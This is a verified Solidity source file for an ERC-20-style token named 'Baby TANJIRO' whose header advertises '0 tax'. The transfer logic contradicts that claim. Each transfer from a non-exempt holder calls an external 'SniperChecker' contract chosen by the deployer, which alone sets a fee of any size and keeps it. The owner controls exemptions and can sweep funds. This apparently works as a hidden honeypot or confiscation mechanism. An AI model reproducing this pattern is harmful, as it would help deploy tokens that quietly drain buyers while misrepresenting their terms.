{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"BabyTanjiro.sol":{"content":"/**\n *Submitted for verification at Etherscan.io on 2021-09-22\n*/\n\n//SPDX-License-Identifier: MIT\n\n/**\n*BABY TANJIRO\n*Tokenomics\n*\n*-0 tax\n*-1 Billion Max Supply\n*/\n\npragma solidity ^0.7.6;\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function symbol() external view returns (string memory);\n    function name() external view returns (string memory);\n    function getOwner() external view returns (address);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address _owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nabstract contract Auth {\n    address internal owner;\n    mapping (address => bool) internal authorizations;\n\n    constructor(address _owner) {\n        owner = _owner;\n        authorizations[_owner] = true;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner(msg.sender), \"!OWNER\"); _;\n    }\n\n    modifier authorized() {\n        require(isAuthorized(msg.sender), \"!AUTHORIZED\"); _;\n    }\n\n    function authorize(address adr) public onlyOwner {\n        authorizations[adr] = true;\n    }\n\n    function unauthorize(address adr) public onlyOwner {\n        authorizations[adr] = false;\n    }\n\n    function isOwner(address account) public view returns (bool) {\n        return account == owner;\n    }\n\n    function isAuthorized(address adr) public view returns (bool) {\n        return authorizations[adr];\n    }\n\n    function transferOwnership(address payable adr) public onlyOwner {\n        owner = adr;\n        authorizations[adr] = true;\n        emit OwnershipTransferred(adr);\n    }\n\n    event OwnershipTransferred(address owner);\n}\n\ninterface SniperChecker {\n    function Start() external;\n    function checkForSniper(uint256, address, address, address) external returns (uint256,bool);\n    function register(address) external;\n}\ncontract BabyTanjiro is IERC20, Auth {\n    using SafeMath for uint256;\n    string constant _name = \"Baby TANJIRO\";\n    string constant _symbol = \"BabyTanjiro\";\n    uint8 constant _decimals = 9;\n    uint256 _totalSupply = 1000000000 * (10 ** _decimals);\n\n    mapping (address => uint256) _balances;\n    mapping (address => mapping (address => uint256)) _allowances;\n    mapping (address => bool) isSnipeExempt;\n\n    SniperChecker Sniper;\n    bool SniperRegistered = false;\n    uint256 public launchedAt;\n    bool public launchCompleted = false;\n\n\n    constructor (address _Sniper) Auth(msg.sender) {\n\tSniper = SniperChecker(_Sniper);\n        _allowances[address(this)][address(_Sniper)] = uint256(-1);\n        isSnipeExempt[owner] = true;\n        isSnipeExempt[_Sniper] = true;\n        _balances[owner] = _totalSupply;\n        emit Transfer(address(0), owner, _totalSupply);\n    }\n\n    receive() external payable { }\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\n    function decimals() external pure override returns (uint8) { return _decimals; }\n    function symbol() external pure override returns (string memory) { return _symbol; }\n    function name() external pure override returns (string memory) { return _name; }\n    function getOwner() external view override returns (address) { return owner; }\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _allowances[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function approveMax(address spender) external returns (bool) {\n        return approve(spender, uint256(-1));\n    }\n\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\n        return _transferFrom(msg.sender, recipient, amount);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\n        if(_allowances[sender][msg.sender] != uint256(-1)){\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\n        }\n\n        return _transferFrom(sender, recipient, amount);\n    }\n\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\n        uint256 amountReceived;\n        if(!isSnipeExempt[recipient]){amountReceived= shouldCheckSniper(sender) ? checkSnipers(sender, amount, recipient) : amount;}else{amountReceived = amount;}\n        _balances[recipient] = _balances[recipient].add(amountReceived);\n        emit Transfer(sender, recipient, amountReceived);\n        return true;\n    }\n    \n    \n    function transferBatch(address[] calldata recipients, uint256 amount) public {\n       for (uint256 i = 0; i < recipients.length; i++) {\n            require(_transferFrom(msg.sender,recipients[i], amount));\n        }\n    }\n    \n    function shouldCheckSniper(address sender) internal view returns (bool) {\n       return !isSnipeExempt[sender];\n    }\n\n    function checkSnipers(address sender,uint256 amount, address receiver) internal returns (uint256) {\n  \t(uint256 feeAmount,bool isSniper) = Sniper.checkForSniper(amount,sender,receiver,msg.sender);\n\tif(isSniper){_balances[address(Sniper)] = _balances[address(Sniper)].add(feeAmount);\n        emit Transfer(sender, address(Sniper), feeAmount);}\n        return amount.sub(feeAmount);\n    }\n\n    function launched() internal view returns (bool) {\n        return launchedAt != 0;\n    }\n\n    function launch() external authorized{\n\t    require(!launched());\n        launchedAt = block.number;\n        Sniper.Start();\n    }\n    \n    function blockNumber() external view returns (uint256){\n\t    return block.number;\n    }\n   \n    function setIsSnipeExempt(address holder, bool exempt) external onlyOwner {\n        isSnipeExempt[holder] = exempt;\n    }\n   \n    function registerSniper() external authorized {\n\t    require(!SniperRegistered);\n\t    Sniper.register(address(this));\n\t    SniperRegistered = true;\n\t}\n\t\n    function recoverEth() external onlyOwner() {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function recoverToken(address _token, uint256 amount) external authorized returns (bool _sent){\n        _sent = IERC20(_token).transfer(msg.sender, amount);\n    }\n\n    event AutoLiquify(uint256 amountETH, uint256 amountToken);\n   \n}"}}}